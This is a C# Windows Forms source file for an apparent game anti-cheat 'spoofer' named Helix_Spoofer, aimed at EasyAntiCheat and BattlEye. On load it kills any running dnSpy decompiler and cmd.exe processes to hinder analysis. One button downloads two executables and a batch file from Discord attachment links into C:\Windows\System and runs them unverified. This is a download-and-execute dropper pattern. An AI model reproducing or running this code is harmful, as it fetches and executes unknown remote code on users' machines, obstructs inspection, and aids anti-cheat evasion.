﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Helix_Spoofer
{
    public partial class SpoofSettings : Form
    {
        public SpoofSettings()
        {
            InitializeComponent();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            spoofeac_loader main = new spoofeac_loader();
            main.Show();
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            Spoofer_BE main = new Spoofer_BE();
            main.Show();
        }

        private void SpoofSettings_Load(object sender, EventArgs e)
        {
            Process[] dnSpy = Process.GetProcessesByName("dnSpy");
            foreach (Process worker in dnSpy)
            {
                worker.Kill();

            }


            Process[] CEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE = Process.GetProcessesByName("cmd.exe");
            foreach (Process CEE in CEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE)
            {
                CEE.Kill();

            }
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/965989803973832708/977229274337652776/Dyno_multi_deep_cleaner_.exe", @"C:\Windows\System\Dyno_multi_deep_cleaner_.exe");
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/965989803973832708/984391098950631464/cleaner_fixed.exe", @"C:\Windows\System\cleaner_fixed.exe");
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/965989803973832708/984390684557578270/reg.bat", @"C:\Windows\System\reg.bat");


            System.Diagnostics.Process.Start(@"C:\Windows\System\Dyno_multi_deep_cleaner_.exe");
            System.Diagnostics.Process.Start(@"C:\Windows\System\cleaner_fixed.exe");
            System.Diagnostics.Process.Start(@"C:\Windows\System\reg.bat");
        }
    }
}
